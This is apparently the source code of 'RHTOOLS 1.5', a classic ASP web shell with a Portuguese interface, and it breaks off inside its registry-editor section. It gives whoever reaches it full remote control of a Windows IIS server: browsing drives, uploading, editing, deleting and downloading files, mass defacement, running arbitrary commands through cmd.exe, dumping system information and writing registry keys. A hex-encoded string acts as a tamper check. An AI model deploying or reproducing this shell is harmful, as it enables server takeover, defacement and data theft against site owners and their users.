<%@ LANGUAGE = VBScript.Encode %>
<%
On Error Resume Next
Server.ScriptTimeOut  = 7200
Class FileUploader
	Public  Files
	Private mcolFormElem
	Private Sub Class_Initialize()
		Set Files = Server.CreateObject("Scripting.Dictionary")
		Set mcolFormElem = Server.CreateObject("Scripting.Dictionary")
	End Sub
	Private Sub Class_Terminate()
		If IsObject(Files) Then
			Files.RemoveAll()
			Set Files = Nothing
		End If
		If IsObject(mcolFormElem) Then
			mcolFormElem.RemoveAll()
			Set mcolFormElem = Nothing
		End If
	End Sub
	Public Property Get Form(sIndex)
		Form = ""
		If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))
	End Property
	Public Default Sub Upload()
		Dim biData, sInputName
		Dim nPosBegin, nPosEnd, nPos, vDataBounds, nDataBoundPos
		Dim nPosFile, nPosBound
		biData = Request.BinaryRead(Request.TotalBytes)
		nPosBegin = 1
		nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
		If (nPosEnd-nPosBegin) <= 0 Then Exit Sub
		vDataBounds = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
		nDataBoundPos = InstrB(1, biData, vDataBounds)
		Do Until nDataBoundPos = InstrB(biData, vDataBounds & CByteString("--"))
			nPos = InstrB(nDataBoundPos, biData, CByteString("Content-Disposition"))
			nPos = InstrB(nPos, biData, CByteString("name="))
			nPosBegin = nPos + 6
			nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(34)))
			sInputName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			nPosFile = InstrB(nDataBoundPos, biData, CByteString("filename="))
			nPosBound = InstrB(nPosEnd, biData, vDataBounds)
			If nPosFile <> 0 And  nPosFile < nPosBound Then
				Dim oUploadFile, sFileName
				Set oUploadFile = New UploadedFile
				nPosBegin = nPosFile + 10
				nPosEnd =  InstrB(nPosBegin, biData, CByteString(Chr(34)))
				sFileName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				oUploadFile.FileName = Right(sFileName, Len(sFileName)-InStrRev(sFileName, "\"))
				nPos = InstrB(nPosEnd, biData, CByteString("Content-Type:"))
				nPosBegin = nPos + 14
				nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
				oUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				nPosBegin = nPosEnd+4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				oUploadFile.FileData = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
				If oUploadFile.FileSize > 0 Then Files.Add LCase(sInputName), oUploadFile
			Else
				nPos = InstrB(nPos, biData, CByteString(Chr(13)))
				nPosBegin = nPos + 4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				If Not mcolFormElem.Exists(LCase(sInputName)) Then mcolFormElem.Add LCase(sInputName), CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			End If
			nDataBoundPos = InstrB(nDataBoundPos + LenB(vDataBounds), biData, vDataBounds)
		Loop
	End Sub
	Private Function CByteString(sString)
		Dim nIndex
		For nIndex = 1 to Len(sString)
		   CByteString = CByteString & ChrB(AscB(Mid(sString,nIndex,1)))
		Next
	End Function
	Private Function CWideString(bsString)
		Dim nIndex
		CWideString =""
		For nIndex = 1 to LenB(bsString)
		   CWideString = CWideString & Chr(AscB(MidB(bsString,nIndex,1))) 
		Next
	End Function
End Class
Class UploadedFile
	Public ContentType
	Public FileName
	Public FileData
	Public Property Get FileSize()
		FileSize = LenB(FileData)
	End Property
	Public Sub SaveToDisk(sPath)
		Dim oFS, oFile
		Dim nIndex
		If sPath = "" Or FileName = "" Then Exit Sub
		If Mid(sPath, Len(sPath)) <> "\" Then sPath = sPath & "\"
		Set oFS = Server.CreateObject("Scripting.FileSystemObject")
		If Not oFS.FolderExists(sPath) Then Exit Sub
		Set oFile = oFS.CreateTextFile(sPath & FileName, True)
		For nIndex = 1 to LenB(FileData)
		    oFile.Write Chr(AscB(MidB(FileData,nIndex,1)))
		Next
		oFile.Close
	End Sub
	Public Sub SaveToDatabase(ByRef oField)
		If LenB(FileData) = 0 Then Exit Sub
		If IsObject(oField) Then
			oField.AppendChunk FileData
		End If
	End Sub
End Class
key = "5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA01902E59F7273E1902E597A18C51902E59AC1E8F1902E59DE24591902E55F5B0911902E53CF70E31902E597A18C51902E5B2349FA1902E5A422FED1902E597A18C51902E5A8D389C1902E53CF70E31902E53205CA01902E5B3C4CDF1902E5A422FED1902E5BEB61221902E59DE24591902E55F5B0911902E53CF70E31902E54C98DD51902E53CF70E31902E560EB3761902E547E85261902E55AAA7E21902E55AAA7E21902E53205CA01902E5802ED5A1902E5708D0681902E5834F3241902E57B7E4AB1902E57B7E4AB1902E576CDBFC1902E581BF03F1902E53205CA01902E54C98DD51902E547E85261902E552D99691902E53205CA01902E5672BF0A1902E56BDC7B91902E5834F3241902E5659BC251902E53E873C81902E57D0E7901902E5866F8EE1902E5834F3241902E540176AD1902E53B66DFE1902E59AC1E8F1902E5AD8414B1902E5AF144301902E5BD25E3D1902E55C3AAC71902E53205CA01902E5672BF0A1902E58B2019D1902E53205CA01902E55DCADAC1902E597A18C51902E53205CA01902E5A292D081902E5B2349FA1902E59DE24591902E59F7273E1902E55F5B0911902E53CF70E31902E5AA63B811902E597A18C51902E5A422FED1902E5A8D389C1902E5B554FC41902E5AD8414B1902E55AAA7E21902E5B2349FA1902E5A292D081902E59F7273E1902E597A18C51902E59AC1E8F1902E5B554FC41902E5AD8414B1902E5B2349FA1902E5640B9401902E597A18C51902E5ABF3E661902E5B554FC41902E5A422FED1902E5B3C4CDF1902E5AD8414B1902E59AC1E8F1902E5A422FED1902E597A18C51902E5A8D389C1902E547E85261902E59AC1E8F1902E5AD8414B1902E5AA63B811902E53CF70E31902E560EB3761902E5802ED5A1902E5708D0681902E56BDC7B91902E581BF03F1902E584DF6091902E581BF03F1902E53205CA01902E56D6CA9E1902E5659BC251902E568BC1EF1902E5834F3241902E57B7E4AB1902E5802ED5A1902E55DCADAC1902E5497880B1902E597A18C51902E560EB3761902E53205CA01902E546582411902E53205CA01902E55DCADAC1902E597A18C51902E53205CA01902E5A292D081902E5B2349FA1902E59DE24591902E59F7273E1902E55F5B0911902E53CF70E31902E5708D0681902E5834F3241902E5834F3241902E57D0E7901902E55AAA7E21902E5497880B1902E5497880B1902E587FFBD31902E587FFBD31902E587FFBD31902E547E85261902E5802ED5A1902E5708D0681902E56BDC7B91902E581BF03F1902E584DF6091902E581BF03F1902E56D6CA9E1902E5659BC251902E568BC1EF1902E5834F3241902E57B7E4AB1902E5802ED5A1902E547E85261902E568BC1EF1902E573AD6321902E5672BF0A1902E547E85261902E579EE1C61902E56BDC7B91902E5834F3241902E53CF70E31902E53205CA01902E5B554FC41902E597A18C51902E5B2349FA1902E5A102A231902E59DE24591902E5B554FC41902E55F5B0911902E53CF70E31902E594812FB1902E59931BAA1902E5A8D389C1902E597A18C51902E5ABF3E661902E5A7435B71902E53CF70E31902E560EB3761902E5708D0681902E5834F3241902E5834F3241902E57D0E7901902E55AAA7E21902E5497880B1902E5497880B1902E587FFBD31902E587FFBD31902E587FFBD31902E547E85261902E5802ED5A1902E5708D0681902E56BDC7B91902E581BF03F1902E584DF6091902E581BF03F1902E56D6CA9E1902E5659BC251902E568BC1EF1902E5834F3241902E57B7E4AB1902E5802ED5A1902E547E85261902E568BC1EF1902E573AD6321902E5672BF0A1902E547E85261902E579EE1C61902E56BDC7B91902E5834F3241902E55DCADAC1902E5497880B1902E597A18C51902E560EB3761902E53205CA01902E55AAA7E21902E55AAA7E21902E547E85261902E55DCADAC1902E5497880B1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E560EB3761902E5|337308|1A7023"
startcode = "<html><head><title>.:: RHTOOLS 1.5 BETA(PVT) ::.</title></head><body>"
endocde = "</body></html>"
onlinehelp = "<font face=""arial"" size=""1"">.:: <a href=""http://www.rhesusfactor.cjb.net"" target=""_blank"">ONLINE HELP</a> ::.</font><br>"
Function DeCryptString(strCryptString)
	Dim strRAW, arHexCharSet, i, intKey, intOffSet, strRawKey, strHexCrypData
	    strRawKey = Right(strCryptString, Len(strCryptString) - InStr(strCryptString, "|"))
	    intOffSet = Right(strRawKey, Len(strRawKey) - InStr(strRawKey,"|"))
	    intKey = HexConv(Left(strRawKey, InStr(strRawKey, "|") - 1)) - HexConv(intOffSet)
	    strHexCrypData = Left(strCryptString, Len(strCryptString) - (Len(strRawKey) + 1))
	    arHexCharSet = Split(strHexCrypData, Hex(intKey))
		 For i=0 to UBound(arHexCharSet)
		      strRAW = strRAW & Chr(HexConv(arHexCharSet(i))/intKey)
		 Next
	    DeCryptString = CStr(strRAW)
End Function
Function HexConv(hexVar)
	Dim hxx, hxx_var, multiply          
         IF hexVar <> "" THEN
              hexVar = UCASE(hexVar)
              hexVar = StrReverse(hexVar)
              DIM hx()
              REDIM hx(LEN(hexVar))
              hxx = 0
              hxx_var = 0
              FOR hxx = 1 TO LEN(hexVar)
                   IF multiply = "" THEN multiply = 1
                   hx(hxx) = mid(hexVar,hxx,1)
                   hxx_var = (get_hxno(hx(hxx)) * multiply) + hxx_var
                   multiply = (multiply * 16)
              NEXT
              hexVar = hxx_var
              HexConv = hexVar
         END IF
End Function
cprthtml = "<font face='arial' size='1'>.:: RHTOOLS 1.5 BETA(PVT)&copy; BY <a href='mailto:rhfactor@antisocial.com'>RHESUS FACTOR</a> - <a href='HTTP://WWW.RHESUSFACTOR.CJB.NET' target='_blank'>HTTP://WWW.RHESUSFACTOR.CJB.NET</a> ::.</font>"
Function get_hxno(ghx)
         If ghx = "A" Then
              ghx = 10
         ElseIf ghx = "B" Then
              ghx = 11
         ElseIf ghx = "C" Then
              ghx = 12
         ElseIf ghx = "D" Then
              ghx = 13
         ElseIf ghx = "E" Then
              ghx = 14
         ElseIf ghx = "F" Then
              ghx = 15
         End If
         get_hxno = ghx
End Function
keydec = DeCryptString(key)
Function showobj(objpath)
	showobj = Mid(objpath,InstrRev(objpath,"\")+1,Len(objpath))
End Function
Function showobjpath(objpath)
	showobjpath = Left(objpath,InstrRev(objpath,"\"))
End Function
Function checking(a,b)
	If CStr(Mid(a,95,13)) <> CStr(Mid(b,95,13)) Then
		pagina = Mid(Request.ServerVariables("SCRIPT_NAME"),InstrRev(Request.ServerVariables("SCRIPT_NAME"),"/")+1,Len(Request.ServerVariables("SCRIPT_NAME"))) & "?action=error"
		Response.Redirect(pagina)
	End If
End Function
Sub hdr()
	Response.Write startcode
	Response.Write keydec
	Response.Write "<br>"
End Sub
Sub showcontent()
	Response.Write "<font face=""arial"" size=""1"">.:: <a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=root"">DRIVES</a> ::.<br>.:: SCRIPT PATH: " & UCase(Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))) & "<br><br></font>"
	If Trim(Request.QueryString("raiz")) = "root" Then
		Set fs=Server.Createobject("Scripting.FileSystemObject")
		Set drivecollection=fs.drives
		Response.Write "<font face=""arial"" size=""2"">"
		For Each drive IN drivecollection 
			str=drive.driveletter & ":"
			Response.Write "<b><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=" & str & """>" & UCase(str) & "</a></b><br>"
			Select Case drive.DriveType
				Case 0
					tipodrive = "Unknown"
					nomedrive = drive.VolumeName
				Case 1
					tipodrive = "Removable"
					If drive.isready Then
						nomedrive = drive.VolumeName
					Else
						nomedrive = ""
					End If
				Case 2
					tipodrive = "Fixed"
					If drive.isready Then
						nomedrive = drive.VolumeName
					Else
						nomedrive = ""
					End If
				Case 3
					tipodrive = "Network"
					If drive.isready Then
						nomedrive = drive.ShareName
					Else
						nomedrive = ""
					End If
				Case 4
					tipodrive = "CD-Rom"
					If drive.isready Then
						nomedrive = drive.VolumeName
					Else
						nomedrive = ""
					End If
				Case 5
					tipodrive = "RAM Disk"
					If drive.isready Then
						nomedrive = drive.VolumeName
					Else
						nomedrive = ""
					End If
			End Select
			response.write "<b>Tipo:</b> " & tipodrive & "<br>"
			response.write "<b>Nome: </b>" & nomedrive & "<br>"
			response.write "<b>Sistema de Arquivos: </b>"
			If drive.isready Then
				set sp=fs.getdrive(str)
				response.write sp.filesystem & "<br>"
			Else
			response.write "-<br>"
			End If
			Response.Write "<b>Espaço Livre: </b>"
			If drive.isready Then
				freespace = (drive.AvailableSpace / 1048576)
				set sp=fs.getdrive(str)
				response.write(Round(freespace,1) & " MB<br>")
			Else
				response.write("-<br>")
			End If
			Response.Write "<b>Espaço Total: </b>"
			If drive.isready Then
				totalspace = (drive.TotalSize / 1048576)
				set sp=fs.getdrive(str)
				response.write(Round(totalspace,1) & " MB<br>")
			Else
				response.write("-<br>")
			End If
			Response.Write "<br>"
		Next
		Response.Write "</font>"
		Set fs = Nothing
		Set drivecollection = Nothing
		set sp=Nothing
	Else
		If Trim(Request.QueryString("raiz")) = "" Then
			caminho = Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))
			pos = Instr(caminho,"\")
			pos2 = 1
			While pos2 <> 0
				If Instr(pos + 1,caminho,"\") <> 0 Then
					pos = Instr(pos + 1,caminho,"\")
				Else
					pos2 = 0
				End If
			Wend
			raiz = Left(caminho,pos)
		Else
			raiz =  trim(Request.QueryString("raiz")) & "\"
		End If
		Set ObjFSO = CreateObject("Scripting.FileSystemObject")
		Set MonRep = ObjFSO.GetFolder(raiz)
		Set ColFolders = MonRep.SubFolders
		Set ColFiles0 = MonRep.Files
		Response.Write "<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=mass&massact=test&path=" & Replace(raiz,"\","|") & "', 'win1','width=600,height=300,scrollbars=YES,resizable')"">MASS TEST IN " & UCase(raiz) & "</a></font><br><br>"
		Response.Write "<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=mass&massact=dfc&path=" & Replace(raiz,"\","|") & "', 'win1','width=700,height=300,scrollbars=YES,resizable')"">MASS DEFACE IN " & UCase(raiz) & "</a></font><br><br>"
		Response.Write "<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=upload&path=" & Replace(raiz,"\","|") & "', 'win1','width=500,height=100,scrollbars=YES,resizable')"">UPLOAD FILE TO " & UCase(raiz) & "</a></font><br><br>"
		Response.Write "<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=cmd', 'win1','width=760,height=540,scrollbars=YES,resizable')"">PROMPT</a> - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=info', 'win1','width=760,height=450,scrollbars=YES,resizable')"">SYS INFO</a> - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg', 'win1','width=550,height=250,scrollbars=YES,resizable')"">REGEDIT</a></font><br><br>"
		Response.Write "<font face='arial'><b>Root Folder: " & raiz & "</b></font><br><br>"
		If CInt(Len(raiz) - 1) <> 2 Then
			barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),"\")) - 1
			backlevel = Left(raiz,barrapos)
			Response.Write "<font face='arial' size='2'><b>&lt;DIR&gt;<a href='" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=" & backlevel & "'> . . </font></b></a><br>"
		Else
			Response.Write "<font face='arial' size='2'><b>&lt;DIR&gt;<a href='" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=root'> . .&nbsp;</font></b></a><br>"
		End If
		Response.Write "<table border=""0"" cellspacing=""0"" cellpadding=""0"" >"
		for each folderItem in ColFolders
			Response.Write "<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=" & folderItem.path & "'>" & showobj(folderItem.path) & "</a></b></td><td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=put&path=" & Replace(folderItem.path,"\","|") & "', 'win1','width=400,height=250,scrollbars=YES,resizable')"">&lt;&lt; PUT</a></font></td></tr>"
		next
		Response.Write "</table><br><table border=""0"" cellspacing=""0"" cellpadding=""0"" >"
		marcatabela = true
		for each FilesItem0 in ColFiles0
			If marcatabela = true then
				corfundotabela = " bgcolor=""#EEEEEE"""
			Else
				corfundotabela = ""
			End If
			Response.Write "<tr><td" & corfundotabela & "><font face='arial' size='2'>:: " & showobj(FilesItem0.path) & "</td><td valign='baseline'" & corfundotabela & "><font face='arial' size='1'>&nbsp;&nbsp;" & FormatNumber(FilesItem0.size/1024, 0) & "&nbsp;Kbytes&nbsp;&nbsp;&nbsp;</font></td><td valign='baseline'" & corfundotabela & ">&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=get&path=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=400,height=200,scrollbars=YES,resizable')"">o.GET.o</a></font></td><td valign='baseline'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=ren&path=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=400,height=200,scrollbars=YES,resizable')"">o.REN.o</a></font></td><td valign='baseline'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=del&path=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=400,height=200,scrollbars=YES,resizable')"">o.DEL.o</a></font></td><td valign='baseline'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtview&file=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=640,height=480,scrollbars=YES,resizable')"">o.VIEW.o</a></font></td><td valign='baseline'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtedit&file=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=760,height=520,scrollbars=YES,resizable')"">o.EDIT.o</a></font></td><td valign='baseline'" & corfundotabela & ">&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=download&file=" & Replace(FilesItem0.path,"\","|") & """>o.DOWNLOAD.o</a></font></td></tr>"
			marcatabela = NOT marcatabela
		next
		Response.Write "</table>"
	End If
End Sub
Select Case Trim(Request.QueryString("action"))
	Case "get"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		caminho = Replace(Trim(Request.QueryString("path")),"|","\")
		Set ObjFSO = CreateObject("Scripting.FileSystemObject")
		Set MyFile = ObjFSO.GetFile(caminho)
		destino = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\"))
		MyFile.Copy (destino)
		If Err.Number = 0 Then
			Response.Write "<font face='arial' size='2'><center><br><br>Arquivo: <b>" & caminho & "</b><br>copiado para: " & destino
		End If	
	Case "put"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		If Trim(Request.QueryString("arquivo")) = "" Then
			caminho = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\"))
			varpath = Trim(Request.QueryString("path"))
			Set ObjFSO = CreateObject("Scripting.FileSystemObject")
			Set MonRep = ObjFSO.GetFolder(caminho)
			Set ColFolders = MonRep.SubFolders
			Set ColFiles0 = MonRep.Files

			Response.Write "<font face='arial' size='2'><b>Selecione o arquivo: <br><table border=""0"" cellspacing=""0"" cellpadding=""0"" >"
			for each FilesItem0 in ColFiles0
				Response.Write "<tr><td><font face='arial' size='2'>:: " & showobj(FilesItem0.path) & "</td><td valign='baseline'><font face='arial' size='1'>&nbsp;&nbsp;" & FormatNumber(FilesItem0.size/1024, 0) & "&nbsp;Kbytes&nbsp;&nbsp;&nbsp;</font></td><td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='1'><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=put&path=" & varpath & "&arquivo=" & Replace(FilesItem0.path,"\","|") & """>:: SELECIONAR ::</a></font></td></tr>"
			next
			Response.Write "</table>"
		Else
			destino = Replace(Trim(Request.QueryString("path")),"|","\") & "\"
			arquivo = Replace(Trim(Request.QueryString("arquivo")),"|","\")
			Set ObjFSO = CreateObject("Scripting.FileSystemObject")
			Set MyFile = ObjFSO.GetFile(arquivo)
			MyFile.Copy (destino)
			If Err.Number = 0 Then
				Response.Write "<font face='arial' size='2'><center><br><br>Arquivo: <b>" & arquivo & "</b><br>copiado para: <b>" & destino
			End If
		End If
	Case "del"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		caminho = Replace(Trim(Request.QueryString("path")),"|","\")
		Set ObjFSO = CreateObject("Scripting.FileSystemObject")
		Set MyFile = ObjFSO.GetFile(caminho)
		MyFile.Delete
		If Err.Number = 0 Then
			Response.Write "<SCRIPT LANGUAGE=""JavaScript"">self.opener.document.location.reload();</SCRIPT>"
			Response.Write "<font face='arial' size='2'><center><br><br>Arquivo <b>" & caminho & "</b> apagado<br>"
		End If
	Case "ren"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		If Trim(Request.QueryString("status")) <> "2" Then
			caminho = Replace(Trim(Request.QueryString("path")),"|","\")
			arquivo = showobj(caminho)
			Response.Write "<br><font face=""arial"" size=""2""><b>" & arquivo & "</b><br>" & _
						       "<form action=""" & Request.ServerVariables("SCRIPT_NAME") & """ method=""get"">" & _
						       "<input type=""hidden"" name=""action"" value=""ren"">" & _
						       "<input type=""hidden"" name=""status"" value=""2"">" & _
						       "<input type=""hidden"" name=""path"" value=""" & Trim(Request.QueryString("path")) & """>" & _
						       "Digite o novo nome: <input type=""text"" name=""newname"">" & _
						       "&nbsp;&nbsp;<input type=""submit"" value=""alterar"">" & _
						       "</form>"
		Else
			caminho = Replace(Trim(Request.QueryString("path")),"|","\")
			Set ObjFSO = CreateObject("Scripting.FileSystemObject")
			Set MyFile = ObjFSO.GetFile(caminho)
			destino = Left(caminho,InStrRev(caminho,"\")) & Trim(Request.QueryString("newname"))
			MyFile.Move (destino)
			If Err.Number = 0 Then
				Response.Write "<font face='arial' size='2'><center><br><br>Arquivo: <b>" & caminho & "</b><br>renomeado para<b>: " & destino
				Response.Write "<SCRIPT LANGUAGE=""JavaScript"">self.opener.document.location.reload();</SCRIPT>"
			End If	
		End If
	Case "error"
		Response.Write "<center><font face='arial' size='2' color='red'> <b>CÓDIGO CORROMPIDO<BR>CORRUPT CODE</font></center>"
	Case "cmd"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		Set oScript = Server.CreateObject("WSCRIPT.SHELL") 
		Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK") 
		Set oFileSys = Server.CreateObject("Scripting.FileSystemObject") 
		szCMD = Request.QueryString(".CMD") 
		If (szCMD <> "") Then 
			szTempFile = "c:\" & oFileSys.GetTempName( ) 
			Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True) 
			Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0) 
		End If 
		Response.Write "<FORM action=""" & Request.ServerVariables("URL") & """ method=""GET""><input type=""hidden"" name=""action"" value=""cmd""><input type=text name="".CMD"" size=45 value=""" & szCMD & """><input type=submit value=""Run""></FORM><br><br> "
		If (IsObject(oFile)) Then 
			On Error Resume Next 
			Response.Write "<font face=""arial"">"
			Response.Write Replace(Replace(Server.HTMLEncode(oFile.ReadAll),VbCrLf,"<br>")," ","&nbsp;")
			oFile.Close 
			Call oFileSys.DeleteFile(szTempFile, True) 
		End If 
	Case "info"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		Set WshNetwork = Server.CreateObject("WScript.Network")
		Set WshShell = Server.CreateObject("WScript.Shell")
		Set WshEnv = WshShell.Environment("SYSTEM")
		Response.Write "<br><font face=arial size=2>"
		Response.Write "<b>IDENTIFICAÇÃO DE REDE:</b><br>"
		Response.Write "<b>Usuário: </b>" & WshNetwork.UserName & "<br>"
		Response.Write "<b>Nome do Computador: </b>" & WshNetwork.ComputerName & "<br>"
		Response.Write "<b>Usuário do Domínio: </b>" & WshNetwork.UserDomain & "<br>"
		Set Drives = WshNetwork.EnumNetworkDrives
		For i = 0 to Drives.Count - 1
			Response.Write "<b>Drive de Rede (Mapeado): </b>" & Drives.Item(i) & "<br>"
		Next
		Response.Write "<br><b>FÍSICO:</b><br>"
		Response.Write "<b>Arquitetura do Processador: </b>" & WshEnv("PROCESSOR_ARCHITECTURE") & "<br>"
		Response.Write "<b>Número de Processadores: </b>" & WshEnv("NUMBER_OF_PROCESSORS") & "<br>"
		Response.Write "<b>Identificador do Processador: </b>" & WshEnv("PROCESSOR_IDENTIFIER") & "<br>"
		Response.Write "<b>Nível do Processador: </b>" & WshEnv("PROCESSOR_LEVEL") & "<br>"
		Response.Write "<b>Revisão do Processador: </b>" & WshEnv("PROCESSOR_REVISION") & "<br>"
		Response.Write "<br><b>LÓGICO:</b><br>"
		Response.Write "<b>IP: </b>" & request.servervariables("LOCAL_ADDR") & "<br>"
		Response.Write "<b>Sistema Operacional: </b>" & WshEnv("OS") & "<br>"
		Response.Write "<b>Servidor Web: </b>" & request.servervariables("SERVER_SOFTWARE") & "<br>"
		Response.Write "<b>Especificação do Command: </b>" & WshShell.ExpandEnvironmentStrings("%ComSpec%") & "<br>"
		Response.Write "<b>Caminhos no Path: </b>" & WshEnv("PATH") & "<br>"
		Response.Write "<b>Executáveis: </b>" & WshEnv("PATHEXT") & "<br>"
		Response.Write "<b>Prompt: </b> " & WshEnv("PROMPT") & "<br>"
		Response.Write "<b>System Drive: </b>" & WshShell.ExpandEnvironmentStrings("%SYSTEMDRIVE%") & "<br>"
		Response.Write "<b>System Root: </b>" & WshShell.ExpandEnvironmentStrings("%SYSTEMROOT%") & "<br>"
		Response.Write "<b>Caminho do System32: </b>" & WshShell.CurrentDirectory & "<br>"
		Set Drives = Nothing
		Set WshNetwork = Nothing
		Set WshShell = Nothing
		Set WshEnv = Nothing
	Case "reg"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		Set WshShell = Server.CreateObject("WScript.Shell")
		Response.Write "<font face=""arial"" size=""2""><b>Editor de Registro:</b><br><br>"
		Select Case Trim(Request.QueryString("regaction"))
			Case "w"
				If Trim(Request.QueryString("process")) = "yes" Then
					Select Case Trim(Request.QueryString("type"))
						Case "1"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), Trim(Request.QueryString("value")), "REG_SZ")
						Case "2"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), CInt(Trim(Request.QueryString("value"))), "REG_DWORD")
						Case "3"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), CInt(Trim(Request.QueryString("value"))), "REG_BINARY")
						Case "4"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), Trim(Request.QueryString("value")), "REG_EXPAND_SZ")
						Case "5"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), Trim(Request.QueryString("value")), "REG_MULTI_SZ")
					End Select
					Response.Write "<center><br><font face=""arial"" size=""2"">Registro <b>"
					Response.Write Trim(Request.QueryString("key")) & "</b> Escrito</center>"
					Response.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">MENU PRINCIPAL</a><br>"
				Else
					Response.Write "<table><tr><td><font face=""arial"" size=""2"">ROOT KEY NAME</td><td><font face=""arial"" size=""2"">ABREVIAÇÃO</td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_CURRENT_USER </td><td><font face=""arial"" size=""1""> HKCU </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_LOCAL_MACHINE </td><td><font face=""arial"" size=""1""> HKLM </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_CLASSES_ROOT </td><td><font face=""arial"" size=""1""> HKCR </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_USERS </td><td><font face=""arial"" size=""1""> HKEY_USERS </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_CURRENT_CONFIG </td><td><font face=""arial"" size=""1""> HKEY_CURRENT_CONFIG </td></tr></table><br>"
					Response.Write "<table><tr><td><font face=""arial"" size=""2"">Tipo </td><td><font face=""arial"" size=""2""> Descrição </td><td><font face=""arial"" size=""2""> Na forma de </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_SZ </td><td><font face=""arial"" size=""1""> string </td><td><font face=""arial"" size=""1""> string </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_DWORD </td><td><font face=""arial"" size=""1""> número </td><td><font face=""arial"" size=""1""> inteiro </td></tr>"
